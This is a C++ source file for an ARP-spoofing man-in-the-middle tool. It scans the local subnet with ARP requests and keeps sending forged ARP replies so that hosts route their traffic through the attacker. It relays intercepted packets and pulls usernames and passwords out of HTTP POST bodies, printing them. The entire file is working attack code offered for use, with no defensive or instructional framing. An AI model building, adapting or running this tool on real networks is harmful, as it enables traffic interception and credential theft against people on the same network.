#include "mitm_attack.hpp"

// #define DEBUG 1
// #define INFO 1

// Function to handle receiving ARP responses
void receive_responses(int sd, std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> &ip_mac_pairs, std::array<uint8_t, 6> my_mac, uint32_t gateway_ip, struct sockaddr_ll &device) {
    uint8_t buffer[IP_MAXPACKET];
    struct sockaddr saddr;
    int saddr_len = sizeof(saddr);
    // Receive ARP responses
    printf("Available devices\n");
    printf("-----------------------------------------\n");
    printf("IP\t\t\tMAC\n");
    printf("-----------------------------------------\n");

    uint32_t src_ip = 0;
    while (true) {
        // Receive packet
        int bytes = recvfrom(sd, buffer, IP_MAXPACKET, 0, &saddr, (socklen_t *)&saddr_len);
        if (bytes < 0) {
            perror("recvfrom() failed");
            exit(EXIT_FAILURE);
        }

        // Check if packet is an ARP packet
        if (buffer[12] == ETH_P_ARP / 256 && buffer[13] == ETH_P_ARP % 256) {
            arp_hdr *arphdr = (arp_hdr *)(buffer + ETH_HDRLEN);

            // Check if ARP packet is a response
            if (ntohs(arphdr->opcode) == ARPOP_REPLY) {
                // Save IP-MAC pair
                ip_mac_pairs[arphdr->sender_ip] = arphdr->sender_mac;

                // If the IP address is the gateway IP, continue
                if (arphdr->sender_ip[0] == (gateway_ip & 0xff) && arphdr->sender_ip[1] == ((gateway_ip >> 8) & 0xff) && arphdr->sender_ip[2] == ((gateway_ip >> 16) & 0xff) && arphdr->sender_ip[3] == ((gateway_ip >> 24) & 0xff)) {
                    continue;
                }

                // Print source IP address
                printf("%d.%d.%d.%d\t\t", arphdr->sender_ip[0], arphdr->sender_ip[1], arphdr->sender_ip[2], arphdr->sender_ip[3]);
                // Print source MAC address
                for (int i = 0; i < 5; i++) {
                    printf("%02x:", arphdr->sender_mac[i]);
                }
                printf("%02x\n", arphdr->sender_mac[5]);
            }
        }
        // Check if packet is an ICMP packet
        if (bytes < ETH_HDRLEN + sizeof(struct iphdr)) {
            continue;  // Not enough data for IP header
        }
        struct iphdr *iph = (struct iphdr *)(buffer + ETH_HDRLEN);  // Skip the Ethernet header
        if (iph->protocol == IPPROTO_ICMP) {
            // Get the Ethernet header
            struct ethhdr *eth = (struct ethhdr *)buffer;

            // Save the source IP
            if (src_ip == 0 && iph->saddr != gateway_ip) {
                src_ip = iph->saddr;
            }

            // Change the source MAC to my MAC
            memcpy(eth->h_source, my_mac.data(), ETH_ALEN);

            // If the source IP is src_ip, change the destination MAC to the gateway's MAC
            if (iph->saddr == src_ip) {
                // Find the MAC address for the gateway IP
                std::array<uint8_t, 4> gateway_ip_addr;
                memcpy(gateway_ip_addr.data(), &gateway_ip, 4);
                std::array<uint8_t, 6> &gateway_mac = ip_mac_pairs[gateway_ip_addr];
                memcpy(eth->h_dest, gateway_mac.data(), ETH_ALEN);

                // Send the modified packet
                if (sendto(sd, buffer, bytes, 0, (struct sockaddr *)&device, sizeof(device)) == -1) {
                    perror("sendto() failed");
                    exit(EXIT_FAILURE);
                }
            }
            // If the destination IP is src_ip and destination MAC is not my_mac, change the destination MAC to src_ip's MAC
            if (iph->daddr == src_ip && memcmp(eth->h_dest, my_mac.data(), ETH_ALEN) != 0) {
                // Find the MAC address for the destination IP
                std::array<uint8_t, 4> dest_ip_addr;
                memcpy(dest_ip_addr.data(), &iph->daddr, 4);
                std::array<uint8_t, 6> &dest_mac = ip_mac_pairs[dest_ip_addr];
                memcpy(eth->h_dest, dest_mac.data(), ETH_ALEN);

                // Send the modified packet
                if (sendto(sd, buffer, bytes, 0, (struct sockaddr *)&device, sizeof(device)) == -1) {
                    perror("sendto() failed");
                    exit(EXIT_FAILURE);
                }
            }
        }
        // Check if packet is a TCP packet
        if (bytes < ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr)) {
            continue;  // Not enough data for TCP header
        }
        // Get the payload
        uint8_t *payload = buffer + ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr);
        int payload_length = bytes - (ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr));

        // Check if the payload is an HTTP POST packet
        const char *http_post = "POST";
        bool is_http_post = false;

        if (payload_length >= strlen(http_post) && memcmp(payload, http_post, strlen(http_post)) == 0) {
            is_http_post = true;
        }

        if (is_http_post) {
            // Find the username and password
            char *username_start = strstr((char *)payload, "Username=");
            char *password_start = strstr((char *)payload, "Password=");
            if (username_start && password_start) {
                char *username_end = strchr(username_start, '&');
                char *password_end = (char *)payload + payload_length;

                if (!username_end) {
                    username_end = password_start - 1;
                }

                // Print the username and password
                printf("Username: ");
                for (char *p = username_start + strlen("Username="); p < username_end; p++) {
                    printf("%c", *p);
                }
                printf("\nPassword: ");
                for (char *p = password_start + strlen("Password="); p < password_end; p++) {
                    printf("%c", *p);
                }
                printf("\n");
            }
        }
        memset(buffer, 0, IP_MAXPACKET);
    }
}

// Function to send fake ARP replies
void send_fake_arp_replies(int sd, std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> &ip_mac_pairs, std::array<uint8_t, 6> my_mac, struct sockaddr_ll &device) {
    arp_hdr arphdr;
    arphdr.htype = htons(1);                    // Hardware type (16 bits): 1 for ethernet
    arphdr.ptype = htons(ETH_P_IP);             // Protocol type (16 bits): 2048 for IP
    arphdr.hlen = 6;                            // Hardware address length (8 bits): 6 bytes for MAC address
    arphdr.plen = 4;                            // Protocol address length (8 bits): 4 bytes for IPv4 address
    arphdr.opcode = htons(ARPOP_REPLY);         // OpCode: 2 for ARP reply
    int frame_length = 6 + 6 + 2 + ARP_HDRLEN;  // Ethernet frame length = ethernet header (MAC + MAC + ethernet type) + ethernet data (ARP header)
    std::array<uint8_t, IP_MAXPACKET> ether_frame;

    ether_frame[12] = ETH_P_ARP / 256;
    ether_frame[13] = ETH_P_ARP % 256;
    while (true) {
        for (auto it_i = ip_mac_pairs.begin(); it_i != ip_mac_pairs.end(); ++it_i) {
            for (auto it_j = ip_mac_pairs.begin(); it_j != ip_mac_pairs.end(); ++it_j) {
                if (it_i == it_j) continue;  // Skip sending to self

                // Construct and send fake ARP reply
                std::copy(my_mac.begin(), my_mac.end(), arphdr.sender_mac.begin());              // Sender hardware address (48 bits): MAC address
                std::copy(it_j->first.begin(), it_j->first.end(), arphdr.sender_ip.begin());     // Sender protocol address (32 bits): IP of another pair
                std::copy(it_i->second.begin(), it_i->second.end(), arphdr.target_mac.begin());  // Target hardware address (48 bits): MAC address of current pair
                std::copy(it_i->first.begin(), it_i->first.end(), arphdr.target_ip.begin());     // Target protocol address (32 bits): IP of current pair

                // Destination and Source MAC addresses
                std::copy(it_i->second.begin(), it_i->second.end(), ether_frame.begin());
                std::copy(my_mac.begin(), my_mac.end(), ether_frame.begin() + 6);

                // ARP header
                memcpy(ether_frame.data() + ETH_HDRLEN, &arphdr, ARP_HDRLEN * sizeof(uint8_t));

                // Send ethernet frame to socket.
                if (sendto(sd, ether_frame.data(), frame_length, 0, (struct sockaddr *)&device, sizeof(device)) <= 0) {
                    perror("sendto() failed");
                    exit(EXIT_FAILURE);
                }

#ifdef DEBUG
                // Print fake ARP reply
                printf("Fake ARP reply sent\n");
                printf("Source IP: %d.%d.%d.%d\n", arphdr.sender_ip[0], arphdr.sender_ip[1], arphdr.sender_ip[2], arphdr.sender_ip[3]);
                printf("Source MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", arphdr.sender_mac[0], arphdr.sender_mac[1], arphdr.sender_mac[2], arphdr.sender_mac[3], arphdr.sender_mac[4], arphdr.sender_mac[5]);
                printf("Target IP: %d.%d.%d.%d\n", arphdr.target_ip[0], arphdr.target_ip[1], arphdr.target_ip[2], arphdr.target_ip[3]);
                printf("Target MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", arphdr.target_mac[0], arphdr.target_mac[1], arphdr.target_mac[2], arphdr.target_mac[3], arphdr.target_mac[4], arphdr.target_mac[5]);
                printf("-----------------------------------------\n");
#endif
            }
        }
        std::this_thread::sleep_for(std::chrono::seconds(1));  // Sleep for a while
    }
}

int main(int argc, char **argv) {
    char *interface;
    struct ifreq ifr;
    struct sockaddr_ll device;
    int frame_length, sd, bytes;
    arp_hdr arphdr;
    struct sockaddr_in src_ip;
    struct sockaddr_in netmask;
    std::array<uint8_t, 6> src_mac;
    std::array<uint8_t, 6> dst_mac;
    std::array<uint8_t, IP_MAXPACKET> ether_frame;

    if (argc != 2) {
        printf("Usage: %s <interface>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    // Interface to send packet through.
    interface = argv[1];

    // Copy source IP address.
    get_src_IP(interface, src_ip);

    // Copy source MAC address.
    get_mac_address(interface, src_mac);

    // Copy netmask.
    get_netmask(interface, netmask);

    // Find interface index from interface name and store index in
    // struct sockaddr_ll device, which will be used as an argument of sendto().
    if ((device.sll_ifindex = if_nametoindex(interface)) == 0) {
        perror("if_nametoindex() failed to obtain interface index");
        exit(EXIT_FAILURE);
    }
#ifdef INFO
    printf("src_ip: %s\n", inet_ntoa(src_ip.sin_addr));
    printf("src_mac: %02x:%02x:%02x:%02x:%02x:%02x\n", src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5]);
    printf("netmask: %s\n", inet_ntoa(netmask.sin_addr));
    printf("Index for interface %s is %i\n", interface, device.sll_ifindex);
#endif

    // Set destination MAC address: broadcast address
    std::fill(dst_mac.begin(), dst_mac.end(), 0xff);

    // Copy IP address from sockaddr_in to sender_ip
    std::copy_n(reinterpret_cast<uint8_t *>(&src_ip.sin_addr.s_addr), 4, arphdr.sender_ip.begin());

    // Fill out sockaddr_ll.
    device.sll_family = AF_PACKET;
    std::copy(src_mac.begin(), src_mac.end(), device.sll_addr);
    device.sll_halen = htons(6);

    // ARP header
    arphdr.htype = htons(1);                                               // Hardware type (16 bits): 1 for ethernet
    arphdr.ptype = htons(ETH_P_IP);                                        // Protocol type (16 bits): 2048 for IP
    arphdr.hlen = 6;                                                       // Hardware address length (8 bits): 6 bytes for MAC address
    arphdr.plen = 4;                                                       // Protocol address length (8 bits): 4 bytes for IPv4 address
    arphdr.opcode = htons(ARPOP_REQUEST);                                  // OpCode: 1 for ARP request
    std::copy(src_mac.begin(), src_mac.end(), arphdr.sender_mac.begin());  // Sender hardware address (48 bits): MAC address
    arphdr.target_mac.fill(0);                                             // Target hardware address (48 bits): zero

    // Fill out ethernet frame header.
    frame_length = 6 + 6 + 2 + ARP_HDRLEN;  // Ethernet frame length = ethernet header (MAC + MAC + ethernet type) + ethernet data (ARP header)

    // Destination and Source MAC addresses
    std::copy(dst_mac.begin(), dst_mac.end(), ether_frame.begin());
    std::copy(src_mac.begin(), src_mac.end(), ether_frame.begin() + 6);

    // Ethernet type code (ETH_P_ARP for ARP).
    // http://www.iana.org/assignments/ethernet-numbers
    ether_frame[12] = ETH_P_ARP / 256;
    ether_frame[13] = ETH_P_ARP % 256;

    // Submit request for a raw socket descriptor.
    if ((sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
        perror("socket() failed");
        exit(EXIT_FAILURE);
    }

    uint32_t gateway_ip;
    get_default_gateway(gateway_ip);

    uint32_t base_ip_net = ntohl(src_ip.sin_addr.s_addr) & ntohl(netmask.sin_addr.s_addr);
    uint32_t mask_net = ntohl(~netmask.sin_addr.s_addr);

    for (uint32_t i = 1; i < mask_net; i++) {
        uint32_t dest_ip = htonl(base_ip_net | i);

        std::copy_n(reinterpret_cast<uint8_t *>(&dest_ip), 4, arphdr.target_ip.begin());
        // ARP header
        memcpy(ether_frame.data() + ETH_HDRLEN, &arphdr, ARP_HDRLEN * sizeof(uint8_t));
        // Send ethernet frame to socket.
        if ((bytes = sendto(sd, ether_frame.data(), frame_length, 0, (struct sockaddr *)&device, sizeof(device))) <= 0) {
            perror("sendto() failed");
            exit(EXIT_FAILURE);
        }
    }

    // Use a table to save IP-MAC pairs
    std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> ip_mac_pairs;

    // Start the thread
    std::thread send_thread(send_fake_arp_replies, sd, std::ref(ip_mac_pairs), src_mac, std::ref(device));

    // Receive responses
    receive_responses(sd, ip_mac_pairs, src_mac, gateway_ip, device);

    // Wait for the thread to finish
    send_thread.join();

    // Close socket descriptor.
    close(sd);

    return (EXIT_SUCCESS);
}